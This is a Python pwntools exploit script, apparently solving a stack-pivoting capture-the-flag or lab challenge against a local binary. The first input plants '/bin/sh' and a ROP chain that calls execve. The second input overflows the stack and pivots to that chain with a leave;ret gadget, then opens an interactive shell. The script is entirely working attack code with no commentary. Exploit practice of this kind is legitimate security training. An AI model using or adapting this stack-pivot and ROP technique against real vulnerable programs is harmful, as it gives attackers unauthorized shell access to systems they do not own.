from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

target = 0x4c3300
leave_ret = 0x0000000000401da0
pop_rax_ret = 0x0000000000451477
pop_rdi_ret = 0x0000000000401862
pop_rsi_ret = 0x000000000040f1be
pop_rdx_ret = 0x000000000040176f
syscall = 0x00000000004012d3

r = process('./stack_pivoting')

r.sendlineafter(b': ', b'/bin/sh\x00' + flat(
    pop_rax_ret, 0x3b, 
    pop_rdi_ret, target, 
    pop_rsi_ret, 0, 
    pop_rdx_ret, 0,
    syscall
))

r.sendlineafter(b': ', b'a' * 0x10 + flat(target, leave_ret))

r.interactive()